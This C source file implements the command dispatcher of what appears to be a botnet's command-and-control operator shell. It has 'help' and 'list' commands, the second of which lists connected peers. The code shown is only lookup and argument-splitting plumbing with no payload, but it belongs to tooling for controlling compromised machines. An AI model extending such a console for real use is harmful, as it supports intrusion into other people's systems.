#include "lmem.h"
#include "sclient.h"
#include "speer.h"
#include "scmd.h"
#include "sterm.h"

void helpCMD(tShell_client *client, int args, char *argc[]);

void listPeers(tShell_client *client, int args, char *argc[]) {
    int i;

    shellT_printf("\n");
    for (i = 0; i < client->peerTblCount; i++) {
        if (client->peerTbl[i]) {
            shellT_printf("\n%04d ", i);
            shellC_printInfo(client->peerTbl[i]);
        }
    }
    shellT_printf("\n");
}

#define CREATECMD(_cmd, _help, _callback) ((tShell_cmdDef){.cmd = _cmd, .help = _help, .callback = _callback})

tShell_cmdDef shellS_cmds[] = {
    CREATECMD("help", "Lists avaliable commands", helpCMD),
    CREATECMD("list", "Lists all connected peers to CNC", listPeers),
};

#undef CREATECMD

void helpCMD(tShell_client *client, int args, char *argc[]) {
    int i;

    shellT_printf("\n\n=== [[ Command List ]] ===\n\n");
    for (i = 0; i < (sizeof(shellS_cmds)/sizeof(tShell_cmdDef)); i++) {
        shellT_printf("%04d '%s'\t- %s\n", i, shellS_cmds[i].cmd, shellS_cmds[i].help);
    }
    shellT_printf("\n");
}

tShell_cmdDef *shellS_findCmd(char *cmd) {
    int i;

    /* TODO: make a hashmap for command lookup */
    for (i = 0; i < (sizeof(shellS_cmds)/sizeof(tShell_cmdDef)); i++) {
        if (strcmp(shellS_cmds[i].cmd, cmd) == 0)
            return &shellS_cmds[i]; /* cmd found */
    }

    return NULL;
}

void shellS_initCmds(void) {
    /* stubbed for now, TODO: setup command hashmap */
}

void shellS_cleanupCmds(void) {
    /* stubbed for now, TODO: free command hashmap */
}

char **shellS_splitCmd(char *cmd, int *argSize) {
    int argCount = 0;
    int argCap = 4;
    char **args = NULL;
    char *arg = cmd;

    do {
        /* replace space with NULL terminator */
        if (arg != cmd)
            *arg++ = '\0';

        /* insert into our 'args' array */
        laikaM_growarray(char*, args, 1, argCount, argCap);
        args[argCount++] = arg;
    } while ((arg = strchr(arg, ' ')) != NULL); /* while we still have a delimiter */

    *argSize = argCount;
    return args;
}

void shellS_runCmd(tShell_client *client, char *cmd) {
    tShell_cmdDef *cmdDef;
    char **argc;
    int args;

    argc = shellS_splitCmd(cmd, &args);

    /* find cmd */
    if ((cmdDef = shellS_findCmd(argc[0])) == NULL) {
        shellT_printf("\nUnknown command '%s'!\n\n", cmd);
        return;
    }

    /* run command */
    cmdDef->callback(client, args, argc);

    /* free our argument buffer */
    laikaM_free(argc);
}
